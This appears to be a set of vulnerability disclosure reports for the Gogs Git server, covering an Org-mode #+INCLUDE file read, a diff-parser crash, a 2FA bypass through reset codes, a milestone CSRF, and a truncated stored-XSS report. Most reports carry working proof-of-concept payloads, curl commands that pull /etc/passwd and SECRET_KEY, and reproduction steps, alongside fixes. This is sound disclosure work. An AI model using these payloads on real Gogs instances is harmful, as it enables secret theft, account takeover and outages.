Because the class is public there is no coordinated-disclosure embargo to respect, but Gogs is still unpatched, so report privately first (§9). ## 2. Root cause `go-org` ships an unsafe default for reading included files: - `org/document.go:96` — the `New()` configuration sets `ReadFile: ioutil.ReadFile`. The package doc comments (document.go:31): 'ReadFile is used to read e.g. #+INCLUDE files.' There is no allowlist, no sandbox, and no path restriction anywhere in the package. - `org/keyword.go:147-167` — `parseInclude`: - Regex (keyword.go:40): `(?i)^'([^']+)' (src|example|export) (\w+)$` - `if !filepath.IsAbs(path) { path = filepath.Join(filepath.Dir(d.Path), path) }` — **absolute paths pass through untouched**; there is no `..`, symlink, or absolute-path guard. - `bs, err := d.ReadFile(path)` — the raw file read, executed at render time (the `resolve` closure). - `org/keyword.go:169-188` — `loadSetupFile` performs the same unrestricted `ReadFile` for `#+SETUPFILE:` (blind read: it only merges buffer settings, it does not echo content; `#+INCLUDE` is the disclosure vector). - `org/html_writer.go:222-224` — `WriteInclude` calls `i.Resolve()`, i.e., the page render *performs the read*. - `org/block.go:69` + `org/html_writer.go:627-639` — `isRawTextBlock('SRC'/'EXAMPLE'/'EXPORT')` → `blockContent` sets `htmlEscape = false`, and `WriteText` (html_writer.go:326-334) writes `t.Content` **verbatim, unescaped**. - `org/html_writer.go:160-175` — for `EXPORT` with parameter `html`, `w.WriteString(content + ' ')` emits the raw bytes with **no escaping at all**. Gogs passes untrusted blob bytes straight into this parser: - `internal/markup/orgmode.go:25-31` — `RawOrgMode`: `org.New().Silent().Parse(bytes.NewReader(body), urlPrefix).Write(org.NewHTMLWriter())`. No content or path filtering. - `internal/markup/orgmode.go:34-36` — `OrgMode` → `Render(TypeOrgMode, ...)`. - `internal/markup/markup.go:330-341` — `Detect` selects the renderer by **file extension only**; `.org` → `TypeOrgMode`. An attacker controls the extension by committing a file named `*.org`. - `internal/markup/markup.go:343-368` — `Render` produces `rawHTML`, then `postProcessHTML` + `SanitizeBytes`. The sanitizer (bluemonday UGCPolicy) strips disallowed **tags** but does **not escape plain text**; a line like `SECRET_KEY = abc123` has no tags and passes through verbatim. - `templates/repo/view_file.tmpl:41` — `{{.FileContent | Str2HTML}}`. - `internal/template/template.go:141-143` — `Str2HTML` = `template.HTML(markup.Sanitize(raw))`, which also bypasses Go template auto-escaping. Result: the included file's raw text lands in the served page. ## 3. Attack chain (verified end to end) 1. **Author.** The attacker needs write access to some repository. On the default shipped config self-registration is disabled (`conf/app.ini:219 DISABLE_REGISTRATION = true`), so the realistic preconditions are: (a) deployments with self-registration enabled, or (b) any account created by an admin, or (c) any repo the attacker can collaborate on or fork-push to. One account is enough to host the payload in a public repo. 2. **Craft.** Commit a file `poc.org` containing an INCLUDE directive pointing at an absolute path (see §5). 3. **Render.** The server renders the blob on view: - `cmd/gogs/internal/web/web.go:518-522` — `GET /:owner/:repo/src/*` → `repo.Home`, guarded by `ignSignIn, context.RepoAssignment()` (web.go:530). - `conf/app.ini:217` — `REQUIRE_SIGNIN_VIEW = false` (default): public repos are viewable **anonymously**. - `internal/route/repo/view.go:118-158` — `renderFile` → `markup.Detect(blob.Name())` → `case markup.TypeOrgMode:` → `markup.OrgMode(p, path.Dir(treeLink), ...)`. - The `.org` file itself is tiny, so the `blob.Size() >= conf.UI.MaxDisplayFileSize` guard (view.go:145) does not block; the **INCLUDE target size is never checked**. 4. **Disclose.** go-org reads the target file and emits it raw into HTML; bluemonday + `template.HTML` keep the plain text intact; the response body contains the file contents. ## 4. Impact - **Anonymous arbitrary server file read** on any public repository: - `/custom/conf/app.ini` — `SECRET_KEY` (token/session forging primitive), DB credentials, `[server]` secrets. Config path resolution: `internal/conf/computed.go:62,76-87` (CustomDir = `GOGS_CUSTOM` or `WorkDir()/custom`), `internal/conf/conf.go:68` (`customConf = filepath.Join(CustomDir(), 'conf', 'app.ini')`), `internal/conf/conf.go:203-205` (SECRET_KEY is enforced at startup). - `/etc/passwd`, `.git/config`, env files, TLS keys, any path the `gogs` process can read (which is the service account, typically a git user). - **SECRET_KEY theft** enables known token/session forgery paths in this codebase. - Same bug class as Gitea CVE-2026-59774 (unauthenticated arbitrary file read via Org-mode INCLUDE, Gitea 1.22.1–1.27.0, patched in 1.27.1). Gogs `main` is byte-identical to the audited version (unpatched). ## 5. Proof of Concept ### 5.1 Minimal functional PoC (Gogs render pipeline, Go test — as executed during the audit) Run inside the Gogs module (real `go-org v1.9.1` from `go.mod:37`). This is the exact live-probe used to confirm the finding: ```go // go test -run=TestOrgIncludeProbe ./probe/ package probe import ( 'os' 'testing' 'gogs.io/gogs/internal/markup' ) func TestOrgIncludeProbe(t *testing.T) { // 1. Create a 'secret' file the server should never expose. if err := os.WriteFile('/tmp/orgprobe_secret.txt', []byte('TOPSECRET-12345 '), 0o600); err != nil { t.Fatal(err) } // 2. Render a malicious .org blob through Gogs' own pipeline. body := []byte('#+INCLUDE: '/tmp/orgprobe_secret.txt' src bash ') out := string(markup.RawOrgMode(body, '/someuser/somerepo')) // 3. The secret is present, unescaped, in the HTML. if !strings.Contains(out, 'TOPSECRET-12345') { t.Fatalf('secret not leaked: %s', out) } t.Logf('LEAKED: %s', out) } ``` Observed output (audit run): ``` 
 TOPSECRET-12345
``` The **full `Render` + `SanitizeBytes` path** used by the file view also leaks: ```go leaked := markup.OrgMode(body, '/someuser/somerepo', nil) // 
 // TOPSECRET-12345 //
← still present after sanitization ``` ### 5.2 End-to-end exploit (manual) Preconditions: a repository the attacker can write to, and a public instance (`REQUIRE_SIGNIN_VIEW = false`, default). **Step 1 — commit the payload.** Create `poc.org` in the repository: ```org #+INCLUDE: '/etc/passwd' export html ``` For the config (adjust the absolute path to the deployment's WorkDir): ```org #+INCLUDE: '/home/git/gogs/custom/conf/app.ini' export html ``` > **Notes on path control.** Absolute paths pass through go-org untouched > (keyword.go:154-156). The reliable vector is a full absolute path. Relative > paths are joined onto `filepath.Dir(d.Path)`, where `d.Path` is the render URL > prefix (e.g. `/owner/repo/src/main`), so relative traversal resolves against > that URL-derived path, not the repo; absolute is deterministic. **Step 2 — trigger the render anonymously.** Any visitor (no login) requests the blob view: ```bash curl -s 'http://TARGET/user/repo/src/main/poc.org' | grep -E '^(root|daemon|git):' ``` Observed on the live probe with `/etc/passwd`: ``` root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin git:x:1000:1000:...:/home/git:/bin/bash ... (full file) ``` **Step 3 — exfiltrate SECRET_KEY:** ```bash curl -s 'http://TARGET/user/repo/src/main/poc.org' | grep -E 'SECRET_KEY|PASSWD|HOST' ``` `SECRET_KEY` lines carry no HTML tags, so they pass through bluemonday verbatim. ### 5.3 ASan / UBSan **Not applicable.** This is a Go logic/authorization flaw (unrestricted file path read), not a memory-safety bug. There is no out-of-bounds access, no use-after-free, and no undefined behavior; ASan/UBSan add nothing to detection or repro. The finding reproduces functionally: the target file's bytes appear in the HTTP response. (Go memory safety is enforced by the runtime; Gogs does not use cgo in this path.) ## 6. Fix The root cause is the library default, so fix at the Gogs layer. **Gitea's own patch is the reference**: Gitea 1.27.1 (`modules/markup/orgmode/orgmode.go`, PR `#38642`) replaces the default `ReadFile` on the `org.Configuration` so an INCLUDE never reads the filesystem, it is rendered as inert plain text: ```go cfg := org.New() cfg.ReadFile = func(path string) ([]byte, error) { // orgmode render does not support nested content rendering, // so just leave the plain text to end users return []byte(fmt.Sprintf('#+INCLUDE: [[%s]]', path)), nil } doc := cfg.Silent().Parse(input, '') res, err := doc.Write(w) ``` Applying the same change to `internal/markup/orgmode.go:25-31` (`RawOrgMode`) fixes the disclosure vector in Gogs while preserving INCLUDE's plain-text display. Note the same `Configuration`-level override also neutralizes `#+SETUPFILE` (it calls the same `ReadFile`, keyword.go:174), so no separate filter is needed. Alternative and equivalent fix: strip/reject `#+INCLUDE` and `#+SETUPFILE` lines from `.org` input **before** `Parse`. Regression: add a `.org` test asserting an INCLUDE directive is rendered as inert text and its target content never appears in the output. ## 7. Verified evidence summary | Chain link | Evidence | |---|---| | Unsafe default read | `go-org@v1.9.1/org/document.go:96` `ReadFile: ioutil.ReadFile`; no guard anywhere in package | | INCLUDE matches & reads | `org/keyword.go:147-167`; absolute path untouched (154-156); `d.ReadFile(path)` (158) | | SETUPFILE same read | `org/keyword.go:169-188` (blind read) | | Raw, unescaped emission | `org/block.go:69`; `org/html_writer.go:627-639` (`htmlEscape=false`); `html_writer.go:160-175` (EXPORT html raw); `html_writer.go:326-334` (WriteText verbatim) | | Gogs passes untrusted blob | `internal/markup/orgmode.go:25-31`, `orgmode.go:34-36`, `markup.go:360-367` | | Renderer chosen by extension only | `markup.go:330-341`, `orgmode.go:11` | | Public anonymous reachability | `cmd/gogs/internal/web/web.go:518-522,530` (`ignSignIn`); `conf/app.ini:217` `REQUIRE_SIGNIN_VIEW=false`; `internal/database/permissions.go:80-83` (public repos → read) | | Sanitizer keeps plain text | `internal/markup/sanitizer.go:21-23` (bluemonday UGCPolicy, no text escaping); `templates/repo/view_file.tmpl:41`; `internal/template/template.go:141-143` (`template.HTML`) | | Config file location | `internal/conf/computed.go:62,76-87`; `internal/conf/conf.go:68`; `conf/app.ini:163` `SECRET_KEY` | | Library version pinned | `go.mod:37` `github.com/niklasfasching/go-org v1.9.1`; `go.sum:332-333` | ## 8. Reproduction status - [x] Source-level chain verified line by line - [x] Live reproduction through Gogs' real `RawOrgMode`/`OrgMode` pipeline with `go-org v1.9.1` (secret file + `/etc/passwd` both rendered into HTML, content intact after `SanitizeBytes`) - [x] Cross-model adversarial skeptic (5 attack angles) failed to break the chain; **CONFIRMED CRITICAL** - [x] Same bug class publicly known and fixed upstream in Gitea (CVE-2026-59774, Gitea 1.27.1, PR #38642/#38645) ## 9. Disclosure notes - Gitea's CVE-2026-59774 is published and its fix (PR #38642) shows the exact remediation; no embargo applies to the bug class. - Gogs remains **unpatched** (its `internal/markup/orgmode.go` is byte-identical to the audited commit). Treat this as a live 0-day in Gogs until Gogs ships a fix. - Report to Gogs privately first per Gogs `SECURITY.md`: only GitHub Security Advisories (https://github.com/gogs/gogs/security/advisories/new) is accepted for new reports; must be English and reproducible on latest `main` (it is). Optionally reference the Gitea PR as the known-good patch. - Do not publish this file or a PoC before Gogs has had time to respond; the public bug class lowers the disclosure risk, but Gogs' unpatched status still warrants private coordinated disclosure.

GHSA-p27c-f9fr-4jmw.title: Remote process crash in Gogs diff rendering via a quoted rename path
GHSA-p27c-f9fr-4jmw.description: ## Summary Gogs builds compare and pull request diffs by running `git diff` and passing the output to the diff parser in `github.com/gogs/git-module` v1.8.9. For a rename where the old path is unquoted and the new path is C-quoted, Git produces a header such as: ```text diff --git a/old.txt 'b/new\tname.txt' ``` The parser assumes an unquoted header contains the byte sequence ` b/`. This header contains ` 'b/` instead. `strings.Index` returns -1 and the next slice operation panics with `slice bounds out of range [:-1]`. `Repository.Diff` runs the parser in a goroutine started with `go StreamParseDiff` and does not recover the panic. The panic therefore terminates the entire Gogs process. The HTTP server's handler recovery does not cover this child goroutine. A user who can create a repository, push a commit, or fork a public repository and open a compare or pull request page can produce the commit and load the page. A public repository compare page can also be viewed without signing in. In an isolated Docker lab, the request returned no HTTP response and the container exited with status 2. The crash is repeatable. No confidentiality or integrity impact was demonstrated. ## Root Cause The panic is in `parseFileHeader` in `github.com/gogs/git-module` v1.8.9, `diff.go:255-282`: ```go var diffHead = []byte('diff --git ') func (p *diffParser) parseFileHeader() (*DiffFile, error) { line := string(p.buffer) p.buffer = nil var middle int hasQuote := line[len(diffHead)] == ''' if hasQuote { middle = strings.Index(line, ` 'b/`) } else { middle = strings.Index(line, ` b/`) } beg := len(diffHead) a := line[beg+2 : middle] b := line[middle+3:] ``` Git quotes each path when it contains a tab, double quote, backslash, or newline. In a rename, the two sides can differ in whether they need quoting. With `a/old.txt` and `'b/new\tname.txt'`, `hasQuote` is false because the first path starts with `a`, and the search for ` b/` does not match the header because the separator is followed by a quote. `middle` is -1 and the slice `line[beg+2:middle]` panics. The same failure occurs in the reverse case, where the first path is quoted and the second is not. The parser does not check the result of `strings.Index`. It also indexes `line[len(diffHead)]` without checking that the line is longer than the header prefix. Gogs reaches this code through these paths: - `internal/gitx/diff.go:185-191` `RepoDiff` calls `repo.Diff`. - `github.com/gogs/git-module` `repo_diff.go:31-70` runs `git diff --full-index -M <base> --end-of-options <head>` and starts `go StreamParseDiff` at line 66. The goroutine has no recovery. The request handler blocks at `repo_diff.go:75` waiting on the result channel while the child goroutine panics. - `internal/route/repo/commit.go:141-161` `CompareDiff` calls `RepoDiff` for the `/compare/:before...:after` page. - `internal/route/repo/pull.go:339-362` `ViewPullFiles` calls `RepoDiff` on the head repository for `/pulls/:index/files`. - `internal/route/repo/pull.go:560-595` `PrepareCompareDiff` calls `RepoDiff` while rendering the compare and pull request page. - The routes are registered at `cmd/gogs/internal/web/web.go:452-453`, `:514`, and `:529`. The compare and pull request routes use `ignSignIn` and `RepoAssignment`, so public repositories can be read without signing in. Gogs sets `core.quotepath=false` globally at startup (`internal/database/repo.go:158-162`). That stops Git from quoting ordinary non-ASCII paths, but it does not affect control characters, double quotes, or backslashes. The tab in the reproduced header is still quoted under the running server, as the lab log shows. There is no length check, no separator check, and no panic recovery around the parsing goroutine. `macaron.Recovery()` at `cmd/gogs/internal/web/web.go:759` wraps the handler chain, so it cannot recover a panic on the parser goroutine. The same parser is used by the editor diff preview through `internal/gitx/diff.go:173-182`, which also starts a goroutine without recovery. ## Prerequisites - A Gogs account that can create a repository, push a commit, or fork a public repository and open a compare or pull request page. Repository creation and forking are enabled by default. Self-registration may be disabled, in which case an existing account is needed. - A repository the attacker can write to, or a public base repository that accepts pull requests and a fork owned by the attacker. - A commit that renames a file to a name containing a tab, double quote, backslash, or newline. Creating this commit requires write access to some repository or a fork. - No victim interaction. The attacker loads the compare or pull request page and the server crashes while building the response. - The crash request itself can be unauthenticated. Once a public repository contains the rename commit, any visitor can request the compare page without signing in. - No special configuration. The behavior occurs with the default Git settings used by Gogs. ## Steps to Reproduce All steps below were run in Docker on an isolated `--network none` network with a disposable data directory. The image was built from the target commit. 1. Build the image from the source at commit `43017045492c85e201536bfc7af49fa9f74b0069`: ```sh docker build -f Dockerfile.next -t gogs-lab:4301704 . ``` 2. Create `/data/gogs/conf/app.ini` with a working SQLite configuration: ```ini RUN_USER = git RUN_MODE = prod [server] EXTERNAL_URL = http://localhost:3000/ DISABLE_SSH = true APP_DATA_PATH = /data/gogs/data [repository] ROOT = /data/git/gogs-repositories [database] TYPE = sqlite3 PATH = /data/gogs/data/gogs.db [security] SECRET_KEY = lab-only-secret-key ``` 3. Start the server once to create the database schema, then stop it: ```sh docker run -d --name gogs-lab --network none -v <data-dir>:/data gogs-lab:4301704 # wait for 'Available on http://localhost:3000/', then docker stop gogs-lab ``` 4. Create an administrator. The admin CLI does not create the legacy schema on an empty database, so it must run after step 3: ```sh docker run --rm --network none -v <data-dir>:/data gogs-lab:4301704 \ gogs admin create-user --admin --name alice --password '<admin-password>' --email alice@example.com ``` 5. Start the server again and create a token and a public non-bare repository: ```sh docker run -d --name gogs-lab --network none -v <data-dir>:/data gogs-lab:4301704 docker exec gogs-lab curl -s -u alice:'<admin-password>' \ -X POST http://localhost:3000/api/v1/users/alice/tokens \ -H 'Content-Type: application/json' -d '{'name':'lab'}' docker exec gogs-lab curl -s \ -H 'Authorization: token <token>' -H 'Content-Type: application/json' \ -X POST http://localhost:3000/api/v1/user/repos \ -d '{'name':'demo','auto_init':true,'readme':'Default','private':false}' ``` 6. Clone the repository and push a rename to a quoted name. The tab is written with `printf`: ```sh git clone http://alice:'<admin-password>'@localhost:3000/alice/demo.git cd demo git config user.email a@b.c git config user.name a printf 'x\n' > old.txt git add old.txt git commit -m add parent=$(git rev-parse HEAD) new='new$(printf '\t')name.txt' git mv old.txt '$new' git commit -m rename head=$(git rev-parse HEAD) git push origin master ``` 7. Request the compare view between the two commits. The repository is public, so no credentials are sent: ```sh curl -s -m 10 -o /dev/null -w 'http=%{http_code}\n' \ 'http://localhost:3000/alice/demo/compare/$parent...$head' ``` The client receives no response (`http=000`). The Gogs process exits with status 2. The log shows the panic from `parseFileHeader`. The same commit can be placed in a fork and viewed through `/pulls/<index>/files` or the compare-and-pull-request page, which also call `RepoDiff` on the head repository. ## Evidence - `gogs-panic-clean.log`: the Gogs process log showing the panic, the `parseFileHeader` frame, the `StreamParseDiff` goroutine, and the `Repository.Diff` goroutine. The process terminates after the panic. ```bash 2026/11/11 09:16:59 [ INFO] Gogs 0.15.0+dev 2026/11/11 09:16:59 [ INFO] Run mode: Production 2026/11/11 09:17:00 [ INFO] Git config user.name set to Gogs 2026/11/11 09:17:00 [ INFO] Git config user.email set to gogs@fake.local 2026/11/11 09:17:00 [ INFO] Available on http://localhost:3000/ 2026/11/11 09:17:24 [ INFO] Gogs 0.15.0+dev 2026/11/11 09:17:24 [ INFO] Run mode: Production 2026/11/11 09:17:25 [ INFO] Available on http://localhost:3000/ docker : + mkdir -p /data/gogs /data/git At line:1 char:404 + ... e Directory -Force $dir | Out-Null; docker logs gogs-dos 2>&1 | Out-F ... + ~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (+ mkdir -p /data/gogs /data/git:String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError + exec /app/gogs/gogs web + mkdir -p /data/gogs /data/git + exec /app/gogs/gogs web panic: runtime error: slice bounds out of range [:-1] goroutine 127 [running]: github.com/gogs/git-module.(*diffParser).parseFileHeader(0x1cf7804b700) github.com/gogs/git-module@v1.8.9/diff.go:278 +0x95e github.com/gogs/git-module.(*diffParser).parse(0x1cf7804b700) github.com/gogs/git-module@v1.8.9/diff.go:489 +0x3c5 github.com/gogs/git-module.StreamParseDiff({0x66020a8, 0x1cf79709ce0?}, 0x1cf78891ea0, 0x64, 0x3e8, 0x7d0) github.com/gogs/git-module@v1.8.9/diff.go:553 +0x1d9 created by github.com/gogs/git-module.(*Repository).Diff in goroutine 182 github.com/gogs/git-module@v1.8.9/repo_diff.go:66 +0xb6f ``` - `trigger-transcript.txt`: the parent and rename commit IDs, the compare request, the empty HTTP response, the container exit status, and the panic stack. ```bash Isolated Docker reproduction, Gogs main @ 43017045492c85e201536bfc7af49fa9f74b0069 Setup (summary): - Image built from the source with Dockerfile.next as gogs-lab:4301704. - Container run with --network none and a disposable /data directory. - SQLite database, SSH disabled, self-registration disabled. - Admin user created with `gogs admin create-user` after the first server start created the schema. - Public repository 'alice/demo' created with auto_init=true and readme=Default. - A commit added old.txt, then renamed it to a name containing a tab, and both commits were pushed. Commits: parent=a5c725f316b2ae895d2e18af4b1fc2b109b1660a head=a6ab439d48376ad1694dc716d221f25e86dc1d1e Request: GET http://localhost:3000/alice/demo/compare/a5c725f316b2ae895d2e18af4b1fc2b109b1660a...a6ab439d48376ad1694dc716d221f25e86dc1d1e Observed: http=000 (no HTTP response; connection dropped) Container status immediately after the request: gogs-dos Exited (2) 2 seconds ago Server log: panic: runtime error: slice bounds out of range [:-1] goroutine 127 [running]: github.com/gogs/git-module.(*diffParser).parseFileHeader(0x1cf7804b700) github.com/gogs/git-module@v1.8.9/diff.go:278 +0x95e github.com/gogs/git-module.(*diffParser).parse(0x1cf7804b700) github.com/gogs/git-module@v1.8.9/diff.go:489 +0x3c5 github.com/gogs/git-module.StreamParseDiff({0x66020a8, 0x1cf79709ce0?}, 0x1cf78891ea0, 0x64, 0x3e8, 0x7d0) github.com/gogs/git-module@v1.8.9/diff.go:553 +0x1d9 created by github.com/gogs/git-module.(*Repository).Diff in goroutine 182 github.com/gogs/git-module@v1.8.9/repo_diff.go:66 +0xb6f ``` ## Impact Availability is the only demonstrated impact. A single HTTP request terminates the whole Gogs process on a default configuration. Every repository, user session, SSH connection, and background task on that instance is interrupted until the service is restarted. The attacker can repeat the request after a restart, so the outage can be sustained. A low-privileged user can stop the service for all users, including administrators. An attacker who submits the rename commit through a fork and pull request can affect a public project without write access to the base repository. A public compare page can also be opened without signing in, so the crash does not require the attacker to hold a session on the target instance. No confidentiality or integrity impact was demonstrated. The crash does not expose data or modify repository content. ## Expected Result The diff parser should accept both quoted and unquoted `diff --git` headers, locate the separator between the two paths whether or not either path is quoted, and return an error for any header it cannot parse. A malformed or unexpected diff should produce an error response, not a panic. Even if the parser encounters an unexpected input, the goroutine that parses the diff should recover the panic and send an error to the caller. A parsing failure must not terminate the process. ## Suggested Fix In `github.com/gogs/git-module`: - In `parseFileHeader`, check that the line is longer than `diffHead` before indexing it. - Locate the second path separator regardless of which path is quoted. Accept both ` b/` and ` 'b/`, and treat a missing separator as a parse error. - Bound-check `middle` before slicing, and return an error instead of panicking. - Add regression tests with a rename from an ASCII name to a name containing a tab, a double quote, a backslash, and a newline, and the reverse direction. In Gogs: - Pin a fixed `git-module` release when one is available. - Add a `defer` with `recover` inside the parsing goroutine started by `ParseDiff` and inside any equivalent wrapper, and return the recovered value as an error on the result channel. - Audit the other goroutines that parse repository data for the same failure mode. ## References - Gogs main commit: `43017045492c85e201536bfc7af49fa9f74b0069`, 2026-11-10. - `internal/gitx/diff.go:173-191`, `ParseDiff` and `RepoDiff`. - `internal/route/repo/commit.go:141-161`, `CompareDiff`. - `internal/route/repo/pull.go:339-362` and `:560-595`, pull request diff paths. - `cmd/gogs/internal/web/web.go:452-453`, `:514`, and `:529`, compare and pull request routes. - `internal/database/repo.go:158-162`, global `core.quotepath=false` setting. - `github.com/gogs/git-module` v1.8.9, `diff.go:255-282`, `diff.go:546-560`, and `repo_diff.go:31-70`. - git-module repository: https://github.com/gogs/git-module - Git diff quoting behavior: https://git-scm.com/docs/git-config#Documentation/git-config.txt-corequotePath Additional reproduction details, lab configuration, and request transcripts can be provided to assist with independent verification.

GHSA-pmfh-wh5m-gmjm.title: Password-reset code doubles as a login token through account activation, bypassing the password and 2FA
GHSA-pmfh-wh5m-gmjm.description: ## Summary Account-activation codes and password-reset codes are the same token. The activation endpoint accepts any valid code, including for an account that is already active, and signs the holder in. It never asks for the second factor. So anyone holding a user's password-reset link gets a full session as that user, with no password and no TOTP, and the password stays unchanged. The victim sees nothing. 2FA exists to stop exactly this case: an attacker who has access to the victim's mailbox. Reproduced on `v0.14.3` through `GET /user/activate?code=`, and on `main` @ `dbbd717e` through `POST /api/web/user/activate/complete`. ## Details `userx.GenerateActivateCode` produces both the activation code and the reset code, and `verifyUserActiveCode` verifies both. GHSA-5c3f-6486-3g7g documents this sharing for the lifetime issue. The activation handlers then do the following. v0.14.3, `internal/route/user/auth.go`, `Activate`: ```go if user := verifyUserActiveCode(code); user != nil { ... IsActivated: &v ... _ = c.Session.Set('uid', user.ID) _ = c.Session.Set('uname', user.Name) ``` main, `cmd/gogs/internal/web/webapi_user.go`, `postUserActivateComplete`: ```go target := verifyUserActiveCode(r.Context(), req.Code) ... IsActivated: &v ... completeSignIn(sess, mc, target) ``` Neither handler requires the account to be inactive, and neither checks `TwoFactors().IsEnabled`. Normal sign-in does check it and sends the user to the TOTP step. ## Proof of concept Setup: the victim enrolls TOTP through the settings page. Email delivery goes to a local SMTP sink. 1. Control: signing in with the correct password stops at the second factor. - v0.14.3: 302 to `/user/login/two_factor`, no session. - main: `{'mfa':true}`, no session. 2. A password reset is requested for the victim's email, and the reset link's `code` is taken from the email. 3. Exploit: - v0.14.3: `GET /user/activate?code=<reset code>` returns 302 to `/`, and the session is logged in as the victim. - main: `POST /api/web/user/activate/complete {'code':'<reset code>'}` returns 204, `/api/web/user/info` returns the victim, and `/user/settings` returns 200. 4. The victim's password hash is unchanged. With the patch below (main) and the equivalent change to the legacy `Activate` handler (v0.14.3), step 3 creates no session: main returns 400, v0.14.3 shows the activation page without signing in. A genuinely unconfirmed account still activates and is signed in on both patched versions. Executed on the official release binaries v0.13.0 (`gogs_0.13.0_linux_amd64.tar.gz`, sha256 `75da1c026cacb187a7c1dcad8263873ec566ce30cc0df56dd1dc129b8292d34f`) and v0.14.3 (`gogs_v0.14.3_linux_amd64.tar.gz`, sha256 `c27fbd8337ebd661929389f5237bf601e09958d514835c99fad3b904c63bedb2`), and on `main` @ `dbbd717e`. Self-contained scripts for both versions are available on request. ## Impact An attacker who can read the victim's mail (a compromised mailbox, a shared inbox, forwarded mail, or mail logs) can take over the account without knowing the password, despite 2FA, and without the visible password change a normal reset would cause. ### Remediation Patch for main (8 lines), tested: ```go if target.IsActive { return http.StatusBadRequest, &bindingErrorResponse{Error: l.Tr('auth.invalid_code')}, nil } ... if database.Handle.TwoFactors().IsEnabled(r.Context(), target.ID) { return http.StatusNoContent, nil, nil } completeSignIn(sess, mc, target) ``` Apply the same change to the legacy `Activate` handler (tested on v0.14.3): ```diff - if user := verifyUserActiveCode(code); user != nil { + if user := verifyUserActiveCode(code); user != nil && !user.IsActive { ... + if database.Handle.TwoFactors().IsEnabled(c.Req.Context(), user.ID) { + c.RedirectSubpath('/user/login') + return + } _ = c.Session.Set('uid', user.ID) ``` Longer term, bind each code to its purpose by including 'activate' or 'reset' in the data that `CreateTimeLimitCode` signs, so the two kinds of code cannot be swapped. I would appreciate a CVE being requested for this issue. ### Credits Please credit as: Dylan McGuinness, Ambit Security (finder, reporter).

GHSA-vghx-gp7m-xpx2.title: CSRF: Milestone open/close via GET request (CWE-352)
GHSA-vghx-gp7m-xpx2.description: ## Vulnerability Details **File**: `cmd/gogs/internal/web/web.go` (route registration), `internal/route/repo/issue.go:1228` (`ChangeMilestonStatus`) **Line**: `cmd/gogs/internal/web/web.go:431` **CWE**: CWE-352 — Cross-Site Request Forgery (CSRF) **Severity**: Low **CVSS**: 4.3 — CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N ### Root Cause `ChangeMilestonStatus` performs a state-changing operation (closing or reopening a repository milestone) and is registered as a `GET` route: ```go m.Group('/milestones', func() { ... m.Get('/:id/:action', repo.ChangeMilestonStatus) // action = 'open' | 'close' m.Post('/delete', repo.DeleteMilestone) }, reqRepoWriter, context.RepoRef()) ``` CSRF token protection (`[session] CSRF_COOKIE_NAME`) was removed from `main` in PR #8300. The session cookie set by `go-macaron/session` (`i_like_gogs`) is `HttpOnly; SameSite=Lax` but does not carry any CSRF token. Under `SameSite=Lax`, the cookie is still sent on a top-level GET navigation (e.g. the victim clicking a link, or any redirect that results in a top-level navigation). Because the milestone status change is wired to `GET`, no token, `Origin`, or `Referer` check is performed, a single crafted link is sufficient to trigger the state change while the victim is authenticated. This is the same class of bug recently fixed in PR #8321 ('Organization team and member management actions accepted GET requests'), which appears to have missed this handler. ### Attack Scenario 1. Victim is signed in to a Gogs instance and has write access to `owner/repo` (collaborator, or org member with write-level team access). 2. Attacker sends the victim a link, e.g.: `https://gogs.example.com/owner/repo/milestones/3/close` 3. Victim clicks the link while logged in. The browser performs a top-level GET navigation and sends the `SameSite=Lax` session cookie. 4. `ChangeMilestonStatus` runs with the victim's session and calls `database.ChangeMilestoneStatus(m, true)`, closing (or reopening, via `/open`) the milestone without the victim's intent. ### Impact Unauthorized opening/closing of repository milestones triggered by a single link click from any authenticated repo writer. No data loss or privilege escalation, but it is a genuine state-changing CSRF on a `GET` endpoint in code that has otherwise just had this exact class of issue fixed elsewhere (#8321). ### Vulnerable Code ```go m.Get('/:id/:action', repo.ChangeMilestonStatus) ``` ```html ... ``` ### Recommended Fix Require `POST` for the status-change route (consistent with the existing `DeleteMilestone` route) and update the UI to submit it via `$.post` instead of a plain link: ```go m.Post('/:id/:action', repo.ChangeMilestonStatus) ``` ```html ... ``` ```js $('.link-action').click(function() { $.post($(this).data('url')).done(function() { window.location.reload(); }); return false; }); ``` ### Verification Dynamically confirmed on `gogs/gogs:edge` (build commit `515f45ae00db60b996aedb9e2c03fbbdb80cfd09`, matching `main` HEAD) in a Docker lab on 2026-06-10: - Created repo `gogsadmin/testrepo`, milestone 'Test Milestone' (id=1, open). - Sent `GET /gogsadmin/testrepo/milestones/1/close` with only the session cookie and forged cross-site `Origin`/`Referer` headers (simulating a cross-site top-level navigation under `SameSite=Lax`). No CSRF token or `X-XSRF-TOKEN` header was sent. - Server responded `302 Found` to `/gogsadmin/testrepo/milestones?state=closed`, and the milestone was confirmed closed (moved from the open list to the closed list) — proving the GET request alone mutated state. A fix has been prepared (branch `fix/milestone-status-csrf`, commit `9b2affe28`) and can be shared for review.

GHSA-vhf5-f34f-vhq9.title: Stored XSS via LDAP bind-DN username rendered unsanitized in Gogs issue and dashboard pages
GHSA-vhf5-f34f-vhq9.description: ## Summary Gogs renders an issue author's username as trusted HTML on issue and dashboard pages. When Gogs is configured for LDAP 'bind DN' authentication, the username that becomes a local Gogs account is taken from an LDAP attribute (for example `cn` or `displayName`) that is never checked for HTML characters, and the issue templates emit that username through the `Safe` template helper without first running it through `Sanitize`. A user whose LDAP attribute value contains an HTML payload such as `` therefore produces a stored cross-site scripting payload that executes in the browser of anyone who views an issue they opened or the dashboard issue list. ## Root Cause The `Name` field of a user is rendered verbatim as HTML in several issue templates, while the sibling display path and other templates correctly sanitize first. Three guards that would normally neutralize HTML in a username are each absent on this path: the LDAP bind-DN query sanitizer permits `<` and `>`, account creation performs no character-set validation, and the `AfterFind` hook sanitizes `FullName` but not `Name`. The last line of defense, the template layer, then calls `Safe` (which converts the string to `template.HTML` and disables Go's contextual auto-escaping) without the `Sanitize` step that the correctly guarded counterpart uses. ```text Permissive LDAP query sanitizer (allows <>): internal/auth/ldap/config.go:64-73 sanitizedUserQuery (badCharacters = '\x00()*\\') cf. internal/auth/ldap/config.go:75-84 sanitizedUserDN (badCharacters includes '<>') No character validation on stored username: internal/database/users.go:286-287 UsersStore.Create -> isUsernameAllowed (reserved names only) internal/database/users.go:1526-1558 isNameAllowed Sanitization gap on read: internal/database/users.go:1276-1281 User.AfterFind (sanitizes 